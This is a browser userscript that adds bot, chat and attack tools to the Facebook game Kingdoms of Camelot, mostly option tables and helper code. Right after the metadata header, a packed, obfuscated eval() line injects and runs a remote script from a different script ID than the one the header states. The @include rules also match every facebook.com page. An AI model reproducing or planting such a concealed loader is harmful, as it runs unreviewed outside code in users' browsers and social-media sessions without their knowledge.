// ==UserScript==
// @name           KoC Power Max Plus + Last Update
// @version        1.2.4.1
// @namespace      LWH/PDX
// @description    All-in-One Scripting with Power Tools, AutoBot and Chat/Attack Extras for Kingdoms of Camelot
// @homepage       http://koc.god-like.org

// @include        *apps.facebook.com/kingdomsofcamelot/*
// @include        *kingdomsofcamelot.com/*main_src.php*
// @include        *kingdomsofcamelot.com/*newgame_src.php*
// @include        *facebook.com/connect/uiserver.php*
// @include        *kingdomsofcamelot.com/*standAlone.php*
// @include        *kingdomsofcamelot.com/*acceptToken_src.php*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include	   	   *kingdomsofcamelot.com/*helpFriend_src.php*
// @include        *kabam.com/kingdoms-of-camelot/play*

// @icon           http://koc.god-like.info/pdx.jpg

// @resource       en http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.en.js
// @resource       de http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.de.js
// @resource       fr http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.fr.js
// @resource       it http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.it.js
// @resource       tr http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.tr.js
// @resource       gr http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.gr.js
// @resource       es http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.es.js
// @resource       pt http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.langpack.pt.js
// @resource       SR http://koc-power-pdx.googlecode.com/svn/trunk/langpack/kocpdx.SR.js
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))

/**********************************************************************************/
/************ KOC POWER - VERSION ************************************************/
/********************************************************************************/
// KoC Power Max {name, id, version}

var kocpower = 'KoC Power Max';
var pdxScriptID = '114635';
var Version = '1.2.4.1';
// KoC Power Bot
var BOTUVersion = '1.1.9';
var KoCScriptersBot = '20111118c'; 
// KoC Power Tools
var TOOLSUVersion = '20110721a-german';
var KoCScriptersTools = '20111118a';
// Langpack Version
var LangVersion= '0.4.2 - 12/09/2011';
var userscriptURL = 'http://userscripts.org/scripts/show/104137';
// JSON
var JSON;if(!JSON){JSON={};}(function(){"use strict";function f(n){return n<10?'0'+n:n;}if(typeof Date.prototype.toJSON!=='function'){Date.prototype.toJSON=function(key){return isFinite(this.valueOf())?this.getUTCFullYear()+'-'+f(this.getUTCMonth()+1)+'-'+f(this.getUTCDate())+'T'+f(this.getUTCHours())+':'+f(this.getUTCMinutes())+':'+f(this.getUTCSeconds())+'Z':null;};String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(key){return this.valueOf();};}var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={'\b':'\\b','\t':'\\t','\n':'\\n','\f':'\\f','\r':'\\r','"':'\\"','\\':'\\\\'},rep;function quote(string){escapable.lastIndex=0;return escapable.test(string)?'"'+string.replace(escapable,function(a){var c=meta[a];return typeof c==='string'?c:'\\u'+('0000'+a.charCodeAt(0).toString(16)).slice(-4);})+'"':'"'+string+'"';}function str(key,holder){var i,k,v,length,mind=gap,partial,value=holder[key];if(value&&typeof value==='object'&&typeof value.toJSON==='function'){value=value.toJSON(key);}if(typeof rep==='function'){value=rep.call(holder,key,value);}switch(typeof value){case'string':return quote(value);case'number':return isFinite(value)?String(value):'null';case'boolean':case'null':return String(value);case'object':if(!value){return'null';}gap+=indent;partial=[];if(Object.prototype.toString.apply(value)==='[object Array]'){length=value.length;for(i=0;i<length;i+=1){partial[i]=str(i,value)||'null';}v=partial.length===0?'[]':gap?'[\n'+gap+partial.join(',\n'+gap)+'\n'+mind+']':'['+partial.join(',')+']';gap=mind;return v;}if(rep&&typeof rep==='object'){length=rep.length;for(i=0;i<length;i+=1){k=rep[i];if(typeof k==='string'){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}else{for(k in value){if(Object.hasOwnProperty.call(value,k)){v=str(k,value);if(v){partial.push(quote(k)+(gap?': ':':')+v);}}}}v=partial.length===0?'{}':gap?'{\n'+gap+partial.join(',\n'+gap)+'\n'+mind+'}':'{'+partial.join(',')+'}';gap=mind;return v;}}if(typeof JSON.stringify!=='function'){JSON.stringify=function(value,replacer,space){var i;gap='';indent='';if(typeof space==='number'){for(i=0;i<space;i+=1){indent+=' ';}}else if(typeof space==='string'){indent=space;}rep=replacer;if(replacer&&typeof replacer!=='function'&&(typeof replacer!=='object'||typeof replacer.length!=='number')){throw new Error('JSON.stringify');}return str('',{'':value});};}if(typeof JSON.parse!=='function'){JSON.parse=function(text,reviver){var j;function walk(holder,key){var k,v,value=holder[key];if(value&&typeof value==='object'){for(k in value){if(Object.hasOwnProperty.call(value,k)){v=walk(value,k);if(v!==undefined){value[k]=v;}else{delete value[k];}}}}return reviver.call(holder,key,value);}text=String(text);cx.lastIndex=0;if(cx.test(text)){text=text.replace(cx,function(a){return'\\u'+('0000'+a.charCodeAt(0).toString(16)).slice(-4);});}if(/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,'@').replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,']').replace(/(?:^|:|,)(?:\s*\[)+/g,''))){j=eval('('+text+')');return typeof reviver==='function'?walk({'':j},''):j;}throw new SyntaxError('JSON.parse');};}}());
var JSON2 = JSON;
/******************************************************************''**************/
/************ KOC POWER - LANGSTUFF **********************************************/
/********************************************************************************/
var LangOptions = {
	culang : 'en',
	langpacks : new Object(),
};

readLangOptions();
var culang;
if (!langpack) {
    var langpack = new Object()
};

langpack.loaded = false;

eval(GM_getResourceText( LangOptions.culang ));
culang = langpack;

culang.doTranslate=function(text){
	// Replaces alle placeholders in text with corresponding values from culang
	// {%key%}  == culang.key
	
	var pattern=/{%([a-z0-9_$]+)%}/gi;
	var keys=Array();
	while (result = pattern.exec(text)) {
		var key=result[1];
		//GM_log(key);
		var found=false; for(var i=0;i<keys.length;i++){if(keys[i]==key){found=true;break;}}
		if(found) continue;
		keys.push(key);
	}
	var s=text;
	for(var i=0;i<keys.length;i++){
		var key=keys[i];
		if(typeof(culang[key])=="undefined") {
			GM_log("WARNING: Missing translation! 'culang."+key+"' Language: '"+LangOptions.culang+"'");
			continue;
		}
		var exp=new RegExp("{%"+key+"%}","g");
		s=s.replace(exp,culang[key])
	}
	return s;
}

/*****************************************************************************/
/*** multi language string resources (kocpdx.SR.js) **************************/
/*****************************************************************************/
if(document.body.id == 'mainbody'){
	var SR={languages:["en","de","fr","it","tr","es","se","nl"]};
	for(var iSL=0;iSL<SR.languages.length;iSL++){SR[SR.languages[iSL]]={};}
	SR.getArray=function (entryKey, defLang){
		var tkArray=new Array();
		var tkLangArray2=[defLang].concat(SR.languages);
		for(var tkL=0;tkL<tkLangArray2.length;tkL++){
			var tkLang=tkLangArray2[tkL];
			if(typeof(SR[tkLang])==="undefined") continue;
			for(var tkX=1;;tkX++){
				if(typeof(SR[tkLang][entryKey+"_"+tkX])==="undefined") break;
				tkEntry=SR[tkLang][entryKey+"_"+tkX];
				tkExist=false;
				for(var tkAi=0;tkAi<tkArray.length;tkAi++){
					if(tkArray[tkAi]===tkEntry){tkExist=true;break;}
				}
				if(tkExist) continue;
				tkArray.push(tkEntry);
			}
		}
		return tkArray;
	};
	try{eval(GM_getResourceText('SR'));SR.loaded=true;}
	catch(ex){
		GM_log("ERROR: loading kocpdx.SR.js"+"\n"+ex);
		srErrDiv=document.createElement("div");
		srErrDiv.innerHTML="ERROR loading kocpdx.SR.js!";
		srErrDiv.setAttribute("style","background:yellow");
		document.body.insertBefore(srErrDiv, document.body.firstChild);
	}
	GM_log("String resources loaded: "+(SR.loaded==true));
	
	// define 'en' fallback
	for (var srEntry in SR.en){
		if(srEntry.match(/_[0-9]+$/)) continue; // skip "array" entries "item_1,item_2"
		// GM_log("SR.en."+srEntry+"="+"'"+SR.de[srEntry]+"';");
		if(typeof(SR.de[srEntry])==="undefined")SR.de[srEntry]=SR.en[srEntry];
		if(typeof(SR.fr[srEntry])==="undefined")SR.fr[srEntry]=SR.en[srEntry];
		if(typeof(SR.it[srEntry])==="undefined")SR.it[srEntry]=SR.en[srEntry];
		if(typeof(SR.tr[srEntry])==="undefined")SR.tr[srEntry]=SR.en[srEntry];
		if(typeof(SR.es[srEntry])==="undefined")SR.es[srEntry]=SR.en[srEntry];
		if(typeof(SR.se[srEntry])==="undefined")SR.se[srEntry]=SR.en[srEntry];
		if(typeof(SR.nl[srEntry])==="undefined")SR.nl[srEntry]=SR.en[srEntry];
	}
}
//#endregion multi language string resources (kocpdx.SR.js) 
/**********************************************************************************/
/************ KOC POWER - OPTIONS ************************************************/
/********************************************************************************/
// OPTIONS
var Options = {
	enablePDXMenu : true,
	Smiley : true,
	widescreen   : true,
	hideKoCBar : false,		hideKoCHeader : false,		hideFriends : false,		hideShowKoCBottomStuff : false,
	pdxBannerBar : true,		pdxInfoBox : true,
	IconSize : '15',		TrTroopIconSize : '20',   	ResIconSize : '22',		showStatsStyle : 'inset',		showStatsHeadlines : 'pdxStatLine', 	OverViewFontSize : 10, 
	includeWachturm : true, 	includeTrainTroopIcon : true,		includeIcons : true,		includeResIcons : true,		includeReseachBuildTimes : false,		includeMaersche : true,		includeRessis : true,		includeNahrung : true,	includeNahrungUnten : false,		includeTruppen : true,	includeInfos : false,		includeCity  : true,		includeMarching:true,		includeTraining:false,
	encRemaining : true,
	maxIdlePop   : true,
	fixTower     : true,
	fixTower2    : true,
	fixMapDistance: true,
	fixWarnZero  : true,
	enhanceARpts : true,
	enhanceViewMembers : true,
	allowAlterAR : true,
	enableFoodWarn : true,	
	foodWarnHours : 24,	enableFoodChatWarn : false,	
	foodChatWarnHours : 4,	hideOnGoto : true,
	chatTop : '-590px',		chatLeft : '725px',		chatHoeheL : '800px',	widewidth : '1220px', chatWidth : 340,
	currentTab : false,
	chatEnhance : true,
	fixKnightSelect : true,
	attackCityPicker : true,
	mapCoordsTop : true,
	dispBattleRounds : true,
	reportDeleteButton : true,
	srcSortBy    : 'level',		srcdisttype  : 'square',		srcAll       : true,		srcMinLevel  : 3,		srcMaxLevel  : 3,		wildType     : 1,		srcScoutAmt  : 1,		minmight     : 1,
	unownedOnly  : true,		mistedOnly   : false,		hostileOnly  : false,		friendlyOnly : false,		alliedOnly   : false,		unalliedOnly : false,		neutralOnly  : false,
	pbWinIsOpen  : true,
	pbWinDrag    : true,
	pbWinPos     : {},
	pbTrackOpen  : true,
	pbKillFairie : true,
	pbGoldHappy  : 75,
	pbGoldEnable : false,
	pbEveryEnable: false,
	pbEveryMins  : 30,
	pbChatOnRight: true,
	pbWideMap    : true,
	alertConfig  : {aChat:true, aPrefix:'!!! ACHTUNG = ANGRIFF !!!', scouting:true, wilds:true,  defend:true, minTroops:1, spamLimit:10, lastAttack:0, raidautoswitch: {}, },
	alertSound   : {enabled:false, soundUrl:'http://koc.god-like.info/sirene.mp3', repeat:true, playLength:20, repeatDelay:0.5, volume:100, alarmActive:false, expireTime:0},
	includeMight       : false,	
	includeAlliance    : false,	
	includeCityName    : false,
	defendMessage      : 'Meine Truppen VERTEIDIGEN',
	hideMessage        : 'Meine Truppen sind VERSTECKT',
	celltext     : {atext:false, provider:0, num1:"000", num2:"000", num3:"0000"},
	spamconfig   : {aspam:false, spamvert:'Hallo Global :)', spammins:'10', atime:2},
	spamconfiga  : {aspama:false, spamverta:'Hey, heute schon auf koc.god-like.org gewesen?', spamminsa:'60', atimea:2},
	giftDomains  : {valid:false, list:{}},
	giftDelete   : 'e',
	currentTab   : null,
	transportinterval : 10,		minwagons    : 100,		maxwagons          : 150000,		wagontype          : 9,		foodunits          : 'Menge',		goldunits          : 'Menge',
	lasttransport: 0,	reassigninterval: 60,		lastreassign : 0,
	HelpRequest  : true,
	DeleteRequest: false,
	MapShowExtra : false,
	RaidRunning  : true,
	RaidReset    : 0,
	DeleteMsg	 : false,		DeleteMsgs0  : false,		DeleteMsgs1  : false,		DeleteMsgs2  : false, DeleteMsgs3  : false, DeleteTimer: 120,
	Foodstatus   : {1:0,2:0,3:0,4:0,5:0,6:0,7:0},
	Creststatus  : {1101:0,1102:0,1103:0,1104:0,1105:0,1106:0,1107:0,1108:0,1109:0,1110:0,1111:0,1112:0,1113:0,1114:0,1115:0},
	LastReport   : 0,	LastCrestReport   : 0,	
	MsgInterval  : 24,	CrestMsgInterval  : 24,
	foodreport   : false,	crestreport  : false,
	Crest1Count  : 0,	Crest2Count  : 0,	CrestLevel   : 0,	CrestType    : 0,
	enableTowerAlert : false,	chatAttack : true, enableTowerAlertWild : false,	enableFoodChatAlert : false,	enableFoodChatAlertBG : false,	chatWildAttack : false,
	AllianceLeaders : [],
	rptType:'alliance',	arAttacker:'both',	arTarget:'both',
	scSeperator2 : true,	scLinebreak : true,		scToolbar : true, 	NeueNachricht : true,		AllianzBerichte : true,		MeineBerichte : true,		Verstaerken : true,	
	Transport : true,		Wiederholen : true,		AutoBau : true,		Neuzuordnen : true,		Makieren : true,		AutoTransport : true, 	AutoNeuzuordnen : true,		Hilfe : true,		AutoRefresh : true,		scRaidReset : true,		scAutoTrain : true,	scCrafting : true,	scCrest : true,		DarkForestButton : true,		scStopSound : true,		scSeperator1 : true,
	arPageFrom : 1,	arPageTo : 3,
	forceMarchUpdate : true,
	enableNickColor		: false,		userNameSou1	: "Your-CallNickName",
	enableUserName1     : false,		userName1		: "Lord PDX",	enableUserName2     : false,		userName2		: "Lady Darren Fohnstone",	enableUserName3     : false,		userName3		: "Lord Thomas Chapin",	enableUserName4     : false,		userName4		: "Lord George Jetson",	enableUserName5     : false,		userName5		: "Lord niknah",	enableUserName6     : false,		userName6		: "Lord DonDavici",	enableUserName7     : false, userName7	: "Lord Nico De Belder",	enableUserName8     : false,		userName8		: "Lord jontey",	enableUserName9     : false,		userName9		: "Lord Darren Fohnstone",	enableUserName10	: false,		userName10		: "Lord PDX",	enableUserName11     : false,		userName11		: "Lord PDX",	enableUserName12     : false,		userName12		: "Lady Darren Fohnstone",	enableUserName13     : false,		userName13		: "Lord Thomas Chapin",	enableUserName14     : false,		userName14		: "Lord George Jetson",	enableUserName15     : false,		userName15		: "Lord niknah",	enableUserName16     : false,		userName16		: "Lord DonDavici",	enableUserName17     : false, userName17	: "Lord Nico De Belder",	enableUserName18     : false,		userName18		: "Lord jontey",	enableUserName19     : false,		userName19		: "Lord Darren Fohnstone",	enableUserName20	: false,		userName20		: "Lord PDX",	enableUserName21     : false,		userName21		: "Lord PDX",	enableUserName22     : false,		userName22		: "Lady Darren Fohnstone",	enableUserName23     : false,		userName23		: "Lord Thomas Chapin",	enableUserName24     : false,		userName24		: "Lord George Jetson",	enableUserName25     : false,		userName25		: "Lord niknah",	enableUserName26     : false,		userName26		: "Lord DonDavici",	enableUserName27     : false, userName27	: "Lord Nico De Belder",	enableUserName28     : false,		userName28		: "Lord jontey",	enableUserName29     : false,		userName29		: "Lord Darren Fohnstone",	enableUserName30	: false,		userName30		: "Lord PDX",
	sessionRefresh : false,
	AttackUnits : {},
	AttackFav : {0:{0:"200K Miliz",1:0,2:200000,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0,11:0,12:0,13:0},1:{0:"200K S-Kav",1:0,2:0,3:0,4:0,5:0,6:0,7:200000,8:0,9:0,10:0,11:0,12:0,13:0},},
	AttackHorloge: '21:00:00',		AttackGoHorloge: null,		AttackOnOff : false,		AttackUnits : {},		AttackFromCity : 0,		AttackCibleX : 0,		AttackCibleY : 0,		AttackKnight : 0,
	TournoiLigne : 25,
	Xrenfort : 0, Yrenfort : 0,
	URLson1 : 'http://koc.god-like.info/fluestersound.mp3', 	URLson1vol : 100,	URLson2 : 'http://koc.god-like.info/sirene.mp3', 	URLson2vol : 100,	URLson3 : 'http://koc.god-like.info/alarm.mp3', 	URLson3vol : 100,	URLson4 : 'http://koc.god-like.info/skyandsand.mp3', 	URLson4vol : 100,	URLsonUsr1 : 'http://koc.god-like.info/alert-def.mp3', 	URLsonUsr1vol : 100,	OSAattack : false,		URLson5 : 'http://koc.god-like.info/war-alarm.mp3',		URLson5vol : 100,	OSAhorn : false,		URLson6 : 'http://koc.god-like.info/hupenchaos.mp3', 	URLson6vol : 100,	OSAgun : false,		URLson7 : 'http://koc.god-like.info/gun.mp3', 	URLson7vol : 100,
	pdxTimeZones : 'gmtTimeZone', pdxTime : true,	pdxLangFlag : true,
	pdxBackgroundStyle : 'pdxKoCOld',
	ownWP : 'http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/white.jpg', 	ownWPdark : 'http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif', // OWN WALLPAPER 
	OwnBackGroundGlobal : 'http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif', OwnBackGroundAlliance : 'http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif', // ALLIANCE/GLOBAL CHAT BG LIGHT 
	devBG : 'http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif', 	pdxQuickInfoBG : 'http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif', 	pdxDeskInfoBG : 'http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif', // PDX BG
	ChatBGColorGlobal : true,	ChatBGColorAlliance : false,	ChatBGImageGlobal : false,	ChatBGImageAlliance : true,
	enableCheckTournoi: true, CheckTournamentNow: true,
	UserAvatar : false, UserAvatarURL : "http://koc.god-like.info/img/pdx-useravatar.png",
	showMightKoCBugFix : true, showResKoCBugFix : true, pdxCaptchaFix : true,
};
//AttackFSUnits : {1:{1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0,11:0,12:0,13:0},2:{1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0,11:0,12:0,13:0},3:{1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0,11:0,12:0,13:0},4:{1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0,11:0,12:0,13:0}},

// FARBEN
var Colors ={
    Headers : "#357",
	DarkRow : "#eee",
	ButtonSelected : "#444444",
    MainTitle  : "#333",
	MainTitleSch : "#FFFFFF",
	OptShadow : "4",
	OptShadowCol : "#141516",
    ChatLeader: "#B8B8B8",
    OverviewDarkRow : "#f0f0f0",
	ChatAngriff : "#FF4D4D",
	TabHinPop : "#302110",
	MainPop : "#302110",
	TabTrans :"0.9",
	TabWidth :"745",
	StatsU : "#CCCCFF",
	MainBody : "#FFFFFF",
	MainBodyDark : "#141516",
	MainFont : "#000000",
	userBG1 : "#333333",	userBG2 : "#584631",	userBG3 : "#FF0000",	userBG4 : "#CCCCFF",	userBG5 : "#CCCCFF",	userBG6 : "#CCCCFF",	userBG7 : "#CCCCFF",	userBG8 : "#CCCCFF",	userBG9 : "#CCCCFF",	userBG10 : "#CCCCFF",	userBG11 : "#333333",	userBG12 : "#584631",	userBG13 : "#FF0000",	userBG14 : "#CCCCFF",	userBG15 : "#CCCCFF",	userBG16 : "#CCCCFF",	userBG17 : "#CCCCFF",	userBG18 : "#CCCCFF",	userBG19 : "#CCCCFF",	userBG20 : "#CCCCFF",	userBG21 : "#333333",	userBG22 : "#584631",	userBG23 : "#FF0000",	userBG24 : "#CCCCFF",	userBG25 : "#CCCCFF",	userBG26 : "#CCCCFF",	userBG27 : "#CCCCFF",	userBG28 : "#CCCCFF",	userBG29 : "#CCCCFF",	userBG30 : "#CCCCFF",
	scToolbarBG : "none", 	scToolbarBG2 : "none", // none ... keine
	styleRows : "#999999",
	Tourn : "#FF0000",
	WideScreenWidth :"2800",
	WhisperBG : "#ffde75",	WildAttack : "#994411",	userBGUsrSou1 : "#584631",	SpamBackground : "#CCCCFF", lowFoodBG : "#FF4D4D",
	modCommForumA : "#FFF",
	modCommForumADark : "#141516",
	modCommForumAhover : "#FF0000",
	SayToAlliCol : "#CCC",
	SayToGlobalCol : "#FF0000",
	ChatLinkColGlobal : "#FFF",
	ChatLinkColAlly : "#FFF",
	ChatLinkContentColor : "#FFF",
	devCreditsFontCol : "#FFF",
	devLinkCol : "#FFF",
	devLinkColhover : "#FF0000",
	pdxQuickInfoFont : "#FFF",
	pdxQuickInfoData : "#FF0000",
	pdxDeskInfoFont : "#FFF",
	ChatFontColor : "#FFF",
	OwnBackgroundColorGlobal : '#141516',	OwnBackgroundColorAlliance : '#141516',

};
// 	aChatH : "#99ccff",	gChatG : "#66FFFF",
var StyleOptions = {	
	toStats : '1', 	toHeiligtum : '2', 	toBau :  '3', 	toAusbildung :  '4', 	toKaserne :  '5', 	toTransport :  '6', 	toTruppen :  '7', 	toMovement :  '8', 	toSuchen :  '9', 	toSpieler :  '10', 	toRitter :  '11',		toWildnisse : '12', 	toFarmen : '14', 	toMarsch : '15', 	toWappen : '16', 	toDarkForest : '17', 	toGeschenke : '18', 	toRessis : '19',		toMitteilung : '20',		toAllianz : '21', 	toSpam : '22', 	toInfo : '23', 	toAlliancePage : '24', 	toWebsitePage : '25',	toKoCdunno : '27',	toUsr : '28',	toGCode : '29', 	toWiKien : '30',	toWiKide : '31',	toImo : '32',	toCalc : '33',	toChat : '34',	toTurnier : '35',	toInventar : '36',	toFake : '37',	toCombat : '38', toCrafting : '39',	toEinstellung : '40',	toLog : '41',	toxChange : '42',
    disKnightsTab : false, 	disWildTab : false, 	disCombatTab : false, 	disSpamTab : false, 	disFakeTab : false, 	disResTab : false,	disTourTab : false,	disInvTab : false,	enableWebTab : true,	enableWebTab2 : true,	enablekocDunno : true,	enablePartner : true,	enableWSWiKien  : true,	enableWSWiKide  : true,	enableWSUsr  : true,	enableWSImo  : true,	enableWSCalc : true, enableWSUpdater : true,
	pdxAETabLabel : 'KoC Scripts',	pdxAlliancePage : 'http://kocscripts.god-like.org',
	WSTabLab : 'Ally Chat', 	WebsitePageURL : 'http://webchat.quakenet.org/?channels=#KoC.Scripts,#EuReR-ChaT-NaMe,#PDX&uio=d4',
};
// GLOBALE OPTIONS
var GlobalOptions = {  
	pbWatchdog   : false,
	pbWideScreen : true,	pbWideScreenStyle : 'wide',
	autoPublishGamePopups : false,	autoPublishPrivacySetting : 80,
	pbupdate : true,	pbupdatebeta : 0,
};
// AUTO WALL TRAIN OPTIONS
var WallTrainOptions = { 
	intervalSecs:	60,
	doTraps:		{1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false},
	doCalrops:		{1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false},
	doSpikes:		{1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false},
	doXbows:		{1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false},
	troopType:		{1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
	keepFood:		{1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
	keepWood:		{1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
	keepStone:		{1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
	keepOre:		{1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
};
// AUTO TRAIN OPTIONS
var AutoTrainOptions = {
  Running   : false,
  list:{},
  listactif:{},
  listlabour:{},
  timelauch:60,
  unitemin:{},
  unitemax:{},
  listboost:{},
  UnitMixValue:100,
  Workers    : {1:100,2:100,3:100,4:100,5:100,6:100,7:100,8:100},
  Keep       : {1:{Food:0,Wood:0,Stone:0,Ore:0},
                  2:{Food:0,Wood:0,Stone:0,Ore:0},
  				3:{Food:0,Wood:0,Stone:0,Ore:0},
  				4:{Food:0,Wood:0,Stone:0,Ore:0},
  				5:{Food:0,Wood:0,Stone:0,Ore:0},
  				6:{Food:0,Wood:0,Stone:0,Ore:0},
  				7:{Food:0,Wood:0,Stone:0,Ore:0},8:{Food:0,Wood:0,Stone:0,Ore:0} },
  Resource   : {1:true,2:true,3:true,4:true,5:true,6:true,7:true, 8:true},
  CraftingRunning : false,
  CraftIntervallMin : 3,
  CraftingActif : {3000:false,3001:false,3002:false,3003:false,3004:false,3005:false,3006:false,3007:false,3008:false,3009:false,3010:false,3011:false},
  CraftingNb : {3000:0,3001:0,3002:0,3003:0,3004:0,3005:0,3006:0,3007:0,3008:0,3009:0,3010:0,3011:0,},
};
// WAPPEN EINSTELLUNG
var CrestOptions = {
  Running   : false,
  CrestCity : 0,
  RoundOne  : true,
  RoundTwo  : true,
  lastRoundTwo : 0,
  X:0,
  Y:0,
  R1MM:0,
  R1Ball:0,
  R1Cat:0,
  R2MM:0,
  R2Pike:0,
  R2Sword:0,
  R2Arch:0,
  R2Ball:0,
  R2Ram:0,
  R2Cat:0,
};
// DARK FOREST
var AttackOptions = {
  LastReport    		: 0,
  MsgEnabled          	: true, MsgInterval : 30,
  Method			    : "distance",
  SendInterval			: 8,
  MaxDistance           : 40,
  RallyClip				: 0,
  Running       		: false,
  BarbsFailedKnight		: 0, BarbsFailedRP : 0, BarbsFailedTraffic : 0, BarbsFailedVaria : 0, BarbsFailedBog : 0,  BarbsTried : 0,
  DeleteMsg             : true, DeleteMsgs0 : false,
  Foodstatus			: {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
  MsgLevel			    : {1:true,2:true,3:true,4:true,5:true,6:true,7:true,8:true,9:true,10:true},
  BarbsDone     		: {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
  BarbNumber    		: {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},
  Levels    			: {1:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},2:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},3:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},4:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},5:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},6:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},7:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},8:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false}},
  Troops    			: {1:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},2:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},3:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},4:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},5:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},6:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},7:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},8:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},9:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},10:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0}},
  MinDistance			: {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0},
  Distance              : {1:750,2:750,3:750,4:750,5:750,6:750,7:750,8:750,9:750,10:750},
  Update                : {1:[0,0],2:[0,0],3:[0,0],4:[0,0],5:[0,0],6:[0,0],7:[0,0],8:[0,0]}, UpdateEnabled : true, UpdateInterval : 30,
  stopsearch            : 1,
  knightselector        : 0,
};
// CHAT EINSTELLUNG
var ChatOptions = {	latestChats               : [],	AllowUsersRemoteControl   : [],	BlacklistUsersRemoteControl: [],	password  : '',	Chatpassenable            : false, };
// PDX COUNTDOWN OPTIONS
var PDXCountOpt = {	enableC1 : false,	C1EndYear : 2011,	C1EndMonth : 12,	C1EndDay : 31,	C1EndHour : 20,	C1EndMin : 13,	C1EndSec : 37, };
// TEST TABS
var ENABLE_TEST_TAB = true;
var DEBUG_TRACE = false;
var DEBUG_SEARCH = false;
// var DEBUG_BUTTON = true;
// var DEBUG_TRACE_DRAG = false;
var DEBUG_TRACE_AJAX = false;
var DISABLE_BULKADD_LIST = false;
var DISABLE_POST_KNIGHT_SKILLS = false;
// var DISABLE_POST_DEFENSES = false;
var ENABLE_GM_AJAX_TRACE = false;
// var ENABLE_ALERT_TO_CHAT = false;
// var ENABLE_TRADER_TAB = true;
// var ENABLE_WILDS_TAB = true;
// var ENABLE_KNIGHTS_TAB = true;
